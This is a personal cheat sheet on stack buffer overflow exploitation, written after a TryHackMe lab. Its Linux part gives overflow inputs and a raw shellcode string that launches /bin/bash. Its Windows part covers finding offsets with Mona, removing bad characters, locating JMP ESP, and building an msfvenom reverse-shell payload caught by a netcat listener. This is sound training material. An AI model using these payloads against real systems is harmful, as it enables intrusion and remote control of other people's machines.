# Buffer Overflow

## Linux Applications

### Send data to applications

* Passing data from the command line
    * `python -c "print 'A' * 40 + '\xef\xbe\xad\xde'" | ./executable`
* Using a file as input in Radare 2
```bash
echo -e "12345678901234\x67\x05\x40" > over.txt
r2 -A -d ./executable
dor stdin=over.txt
doo
```
* Sending stdin data in GDB
    * `run < <(python -c "print 'A' * 40 + '\xef\xbe\xad\xde'")`
* Sending address without needing to convert to little endian first
    * `run < <(python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)')`
* Sending some shell code with padding NOPs
    * `python -c "from struct import pack; print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'.ljust(140,'\x90') +  pack('<L', 0xffffd0e0)"  > /tmp/var`

### Find EIP Offset With PEDA
* Install [PEDA](https://github.com/longld/peda)
    * If you get an error 'Error in sourced command file' when running gdb, just reinstall it `apt install gdb`
* Launch gdb
* Create a pattern with PEDA
    * `pattern create 200`
* Run the program and use pattern as the input
* After the program crashes, look at the value in EIP
* Use the EIP value to get the offset
    * `pattern offset <EIP Address>`


### Resources 
* [Stack Buffer Overflows: Linux - Chapter 1](https://reboare.github.io/bof/linux-stack-bof-1.html)
* [Stack Buffer Overflows: Linux 2 - Using GDB](https://reboare.github.io/bof/linux-stack-bof-2.html)
* [invoke.sh](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966)
* [List of Linux/i386 system calls](http://asm.sourceforge.net/syscall.html)

## Windows Applications

Those are my notes taken after doing the [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep) room on TryHackMe.

There is also a [post explaining the same thing](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst).

### Install Needed Tools
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Mona Plugin](https://github.com/corelan/mona)

### Exploit
* Run the application in Immunity
    * Between each tests, you will need to 
        * Restart the session (Ctrl-F2)
        * Lauch the application (F9)
* Configure Mona
    * `!mona config -set workingfolder c:\mona\%p`
* Try fuzzing the application with the [fuzzing.py](BufferOverflow/Windows/fuzzing.py) script
    * Note how many bytes crashes the application
* Find EIP offset with the [exploit.py](BufferOverflow/Windows/exploit.py) script
    * Use metasploit to generate a pattern 400 bytes longer than the strings that crashed the application
        * `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <BytesToCrashPlus400>`
    * Copy the pattern and use it as payload in the exploit script
    * Run the script
    * Find the offset in Immunity 
        * `!mona findmsp -distance <BytesToCrashPlus400>`
        * This will print a few lines, look for : `EIP contains normal pattern : ... (offset XXXX)`
        * Note the offset
    * Modify the exploit script
        * Set the offset to the one we found
        * Set the return address to BBBB
* Find Bad Charaters
    * Generate a list of possible bad characters with the [generate.py](BufferOverflow/Windows/generate.py) script
        * Copy the generated string and use it as the payload in exploy.py
    * In Immunity generate a byte array with possible characters
        * `!mona bytearray -b "\x00"`
    * Run exploit.py
    * Find bad character in Immunity
        * Copy the ESP address
        * `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`
        * Note the first bad character found not in your list
    * Regenate the Mona bytes array without the found character
        * `!mona bytearray -b "\x00\xXX"`
    * Remove the found character from the payload
    * Repeat until Mona compare returns 'Unmodified'
* Find a Jump Point
    * In Immunity run 
        * `!mona jmp -r esp -cpb "<List of bad characters>"`
    * Open the 'Log data' window and pick an address to jump to from the list
    * Convert the address to little endian
    * Modify the return address in exploit.py to the address you found
* Generate the payload
    * `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<List of bad characters>" -f py`
    * Use the generated code for the payload in exploit.py
* Prepend NOPs
    * Add some NOPs in exploit.py
        * `padding = "\x90" * 16`
* Start your netcat listener
    `nc -klvnp 4444`
* Run the exploit script
